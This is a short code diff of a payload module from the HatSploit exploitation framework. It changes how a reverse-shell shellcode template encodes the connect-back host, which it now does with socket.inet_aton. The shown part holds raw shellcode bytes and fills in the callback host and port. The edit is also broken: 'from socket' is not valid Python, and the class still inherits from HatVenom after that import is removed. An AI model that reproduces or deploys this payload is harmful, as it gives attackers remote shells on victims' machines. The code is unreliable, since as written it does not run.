@@ -5,7 +5,7 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
-from hatvenom import HatVenom
+from socket
 
 from hatsploit.lib.payload import Payload
 from hatsploit.utils.tcp import TCPClient
@@ -99,6 +99,6 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x00\x90\x93\x4c"  # syscall  0x2424d
         ), {
             'cbport': connback_port,
-            'cbhost1': self.ip_bytes(connback_host)[:2],
-            'cbhost2': self.ip_bytes(connback_host)[2:]
+            'cbhost1': socket.inet_aton(connback_host)[:2],
+            'cbhost2': socket.inet_aton(connback_host)[2:]
         }
